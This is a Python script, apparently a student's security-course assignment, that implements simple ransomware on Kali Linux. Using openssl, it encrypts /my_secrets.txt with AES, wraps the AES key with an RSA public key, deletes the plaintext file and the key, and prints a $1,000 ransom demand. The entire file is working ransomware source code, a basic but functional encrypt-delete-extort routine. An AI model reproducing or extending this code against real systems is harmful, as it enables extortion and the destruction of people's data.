# Student name: Edward Wagstaffe
# UOW ID: 8762697
# Simple ransomeware
# CSCI369 - Assignment (Task 3)
# Encrypts a file called my_secrets.txt in the root directory of the victim
# Machines used:
# - Kali Linux
import subprocess
import os

def run_cmd(cmd):
    """Run a shell command and return output; exit on failure."""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Error running command: {cmd}")
        print(result.stderr)
        exit(1)
    return result.stdout.strip()

def generate_symmetric_key():
    # Generate 16-byte base64 key and save to key.txt
    key = run_cmd("openssl rand -base64 16")
    with open("key.txt", "w") as f:
        f.write(key)
    print("[+] Symmetric key generated and saved to key.txt")
    return key

def generate_rsa_keypair():
    # Generate RSA key pair for attacker
    print("[*] Generating RSA key pair...")
    run_cmd("openssl genrsa -out private.pem 2048")
    run_cmd("openssl rsa -in private.pem -pubout -out public.pem")
    print("[+] RSA key pair generated (private.pem, public.pem)")

def encrypt_file_with_symmetric_key():
    # Encrypt /my_secrets.txt using symmetric key (password mode)
    print("[*] Encrypting /my_secrets.txt with symmetric key...")
    cmd = "openssl enc -aes-128-cbc -pbkdf2 -salt -in /my_secrets.txt -out data_cipher.txt -base64 -pass file:key.txt"
    run_cmd(cmd)
    print("[+] /my_secrets.txt encrypted to data_cipher.txt")

def encrypt_key_with_rsa_public_key():
    # Encrypt key.txt with public.pem, base64 encode output to key_cipher.txt
    print("[*] Encrypting key.txt with attacker public key...")
    cmd = "openssl rsautl -encrypt -pubin -inkey public.pem -in key.txt | openssl base64 -out key_cipher.txt"
    run_cmd(cmd)
    print("[+] key.txt encrypted to key_cipher.txt")

def cleanup_files():
    # Delete key.txt and /my_secrets.txt
    print("[*] Cleaning up plaintext files...")
    for filename in ["key.txt", "/my_secrets.txt"]:
        try:
            os.remove(filename)
            print(f"[+] Deleted {filename}")
        except FileNotFoundError:
            print(f"[!] File {filename} not found, skipping deletion.")

def main():
    generate_rsa_keypair()
    generate_symmetric_key()
    encrypt_file_with_symmetric_key()
    encrypt_key_with_rsa_public_key()
    cleanup_files()
    print("\nYour file my_secrets.txt is encrypted. To decrypt it, you need to pay me $1,000 and send key_cipher.txt to me.")

if __name__ == "__main__":
    main()

